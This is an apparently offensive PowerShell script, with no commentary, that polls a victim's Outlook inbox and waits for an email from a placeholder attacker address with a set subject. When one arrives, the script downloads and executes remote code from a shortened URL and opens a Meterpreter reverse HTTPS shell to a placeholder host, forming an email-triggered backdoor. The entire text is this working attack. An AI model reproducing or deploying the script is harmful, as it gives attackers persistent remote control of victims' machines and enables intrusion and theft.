while($true){
$olFolderInbox = 6
$outlook = new-object -com outlook.application;
$ns = $outlook.GetNameSpace("MAPI");
$inbox = $ns.GetDefaultFolder($olFolderInbox)
$inbox.items | foreach { 
if($_.SenderEmailAddress -match "ATTACKER@EMAILADDRESS.COM" -and $_.subject -match "CUSTOMSUBJECT")
{IEX ((New-Object Net.WebClient).DownloadString('http://goo.gl/yfLfQB')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost xxx.xxx.x.xxx -Lport 1111 -Force}
  
}
start-sleep -s 10  
}
